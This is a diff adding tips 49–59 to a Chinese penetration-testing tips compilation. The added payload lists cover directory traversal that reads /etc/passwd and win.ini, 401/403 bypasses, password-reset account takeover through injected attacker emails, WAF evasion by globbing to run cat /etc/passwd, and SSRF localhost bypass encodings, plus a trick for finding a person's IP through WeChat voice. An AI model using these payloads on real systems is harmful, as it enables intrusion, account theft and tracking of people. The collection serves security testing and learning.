@@ -14,6 +14,8 @@
 
 对于个人或团队提交的渗透测试Tips，我会在每个Tips后面，以及文末署名提交人ID，也希望大佬师傅们提交的时候携带自己的ID。
 
+备注：部分所学习的知识点，小技巧可能来自国外文章，通过自己理解整理的，如果大家不太明白，有的会给出地址，可以自己拿来学习~
+
 ## 具体提交渗透测试Tips方式如下：
 
 1、本篇首发于Tools论坛，大家可以再Tools论坛该帖子下面留言，我会定时收集整理。
@@ -320,6 +322,158 @@ HTTP/1.1 200 OK
 
 48、如果响应为401，可以试试在请求头中添加`X-Custom-IP-Authorization: 127.0.0.1`
 
+49、利用火绒剑，配合微信发语音的方式，可以获取该人的登录IP。
+
+50、目录穿越，敏感文件读取一些Payload：
+
+```
+\..\WINDOWS\win.ini
+..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
+.?\.?\.?\etc\passwd
+../../boot.ini
+%0a/bin/cat%20/etc/passwd
+\\&apos;/bin/cat%20/etc/passwd\\&apos;
+..%c1%afetc%c1%afpasswd
+```
+
+51、在访问admin路径面板时可以通过添加`%20`，来绕过，具体如下：
+
+```
+target.com/admin –> HTTP 302 (重定向到登录页面)
+target.com/admin%20/ -> HTTP 200 OK
+target.com/%20admin%20/ -> HTTP 200 OK
+target.com/admin%20/page -> HTTP 200 OK
+```
+
+52、在重置密码的地方，可以尝试添加另外一个次要的账号，比如，手机号，邮箱号等等，比如：
+
+```
+a、构造两个参数：
+	email=victim@xyz.tld&email=hacker@xyz.tld
+b、使用抄送方式:
+	email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld
+c、使用分隔符：
+	email=victim@xyz.tld,hacker@xyz.tld
+	email=victim@xyz.tld%20hacker@xyz.tld
+	email=victim@xyz.tld|hacker@xyz.tld
+d、不使用域名：email=victim
+e、不使用顶级域名：email=victim@xyz
+f、JSON情况：
+{"email":["victim@xyz.tld","hacker@xyz.tld"]}
+```
+
+53、如果有利用邮箱重置密码功能的情况，而且还是JSON传输的情况下，使用SQLmap跑注入，可以将`*`（星号）放在`@`之前，比如：
+
+```
+{“email”:”test*@xxx.com”}
+或者在*（星号）这个地方进行手注
+原因大家可以看这里：https://tools.ietf.org/html/rfc3696#section-3
+
+原文链接：https://www.infosecmatter.com/bug-bounty-tips-7-sep-27/#2_bypass_email_filter_leading_to_sql_injection_json
+```
+
+54、可以获取目标站点的`favicon.ico`图标的哈希值，然后配合shodan进行目标站点资产收集，因为每个目标站点的`favicon.ico`图标的哈希值可能是固定值，因此可以通过该方法从shodan，fofa等等去寻找更多资产。简单的用法：
+
+```
+#python 3
+import mmh3 
+import requests
+import codecs
+response = requests.get("https://www.baidu.com/favicon.ico")
+favicon = codecs.encode(response.content,"base64")
+hash = mmh3.hash(favicon)
+print(hash)
+
+或使用下面这个github项目：
+https://github.com/devanshbatham/FavFreak
+
+shodan搜索语句：http.favicon.hash:哈希值
+fofa搜索语句：icon_hash="-247388890"（但仅限于高级用户使用）
+
+原文链接：https://www.infosecmatter.com/bug-bounty-tips-8-oct-14/#8_database_of_500_favicon_hashes_favfreak
+```
+
+55、绕过403和401的小技巧：
+
+```
+a、添加以下请求头，比如：X-Originating-IP, X-Remote-IP, X-Client-IP, X-Forwarded-For等等；有可能会有一些白名单IP地址可以访问这些敏感数据。
+
+b、如果使用GET方法访问某些路径，返回403，可以先访问允许访问的路径，然后在请求头中，添加下面的头：
+X-Original-URL: /admin
+X-Override-URL: /admin
+X-Rewrite-URL: /admin
+
+c、可以使用下面这些Payload试试
+/accessible/..;/admin
+/.;/admin
+/admin;/
+/admin/~
+/./admin/./
+/admin?param
+/%2e/admin
+/admin#
+
+原文链接：https://www.infosecmatter.com/bug-bounty-tips-8-oct-14/#11_tips_on_bypassing_403_and_401_errors
+```
+
+56、如果访问`/.git`目录返回403，别忘了进一步访问下面的目录，比如：`/.git/config`
+
+57、使用通配符绕过WAF，如果WAF拦截了RCE，LFI的payload，我们可以尝试使用通配符来绕过，比如：
+
+```
+/usr/bin/cat /etc/passwd ==  /???/???/c?t$IFS/?t?/p?s?wd
+? = 任意的单个字符
+* = 任意字符串，也包含置空的字符串
+通配符在常见的系统中都适用，另外我们可以使用$IFS特殊变量取代空白
+$IFS = 内部字段分隔符 = [space], [tab] 或者 [newline]
+
+cat /etc$u/p*s*wd$u
+
+小例子，执行/bin/cat /etc/passwd的写法：
+/*/?at$IFS/???/???swd
+/****/?at$IFS/???/*swd
+/****/?at$IFS/???/*******swd
+
+原文地址：https://www.infosecmatter.com/bug-bounty-tips-9-nov-16/#8_waf_bypass_using_globbing
+```
+
+58、绕过403的一个BurpSuit插件，地址：
+
+```
+https://github.com/sting8k/BurpSuite_403Bypasser
+```
+
+59、SSRF bypass列表，基于localhost（127.0.0.1），如下：
+
+```
+http://127.1/
+http://0000::1:80/
+http://[::]:80/
+http://2130706433/
+http://whitelisted@127.0.0.1
+http://0x7f000001/
+http://017700000001
+http://0177.00.00.01
+http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
+http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/
+http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/
+http://②⑧⑤②⓪③⑨①⑥⑥:80/
+http://④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80/
+http://⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥:80/
+http://0xd8.0x3a.0xd6.0xe3
+http://0xd83ad6e3
+http://0xd8.0x3ad6e3
+http://0xd8.0x3a.0xd6e3
+http://0330.072.0326.0343
+http://000330.0000072.0000326.00000343
+http://033016553343
+http://3627734755
+http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37
+http://216.0x3a.00000000326.0xe3
+
+原文链接：https://www.infosecmatter.com/bug-bounty-tips-10-dec-24/#13_ssrf_bypass_list_for_localhost_127001
+```
+
 ----------------------------------------
 ### 2021年01月21日 - 更新分界线，整理了来自Tools师傅们留言的渗透测试Tips：
 
@@ -388,7 +542,9 @@ sort out.txt | uniq > out2.txt
 
 2021年01月26日 - 整理了几天来自tools师傅们的留言以及个人的渗透测试Tips
 
-2021年01月28日 - 整理更新了第38~48，所学习到的渗透测试Tips.
+2021年01月28日 - 整理更新了第38~48，所学习到的渗透测试Tips
+
+2021年01月29日 - 整理更新了第49~59，所学习到的渗透测试Tips
 
 # 贡献个人（排名不分先）
 
